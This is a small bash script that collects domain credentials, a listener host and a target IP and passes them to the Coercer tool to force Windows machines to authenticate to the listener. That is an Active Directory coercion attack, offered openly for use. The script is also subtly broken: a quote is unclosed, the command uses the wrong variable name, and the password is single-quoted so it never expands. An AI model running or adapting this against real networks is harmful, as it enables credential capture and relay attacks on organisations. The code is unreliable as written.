#!/bin/bash
BOLD="\033[1m"
RED="\033[31m"
RESET="\033[0m"
GREEN="\033[32m"

echo -e "${BOLD}${RED}wow !  coercer Request sender ---<${RESET}"

echo -e "${BOLD}${GREEN}====> Have you installed the coercer ? tool, pipx install coercer <====${RESET}"

echo "Full Domain"
read full_domain

echo "Domain:-"
read domain

echo "username:-
read username

echo "Password:-"
read password

echo "IP address"
read ip


coercer coerce -u $user -p '$password' -d $domain -l $full_domain -t $ip
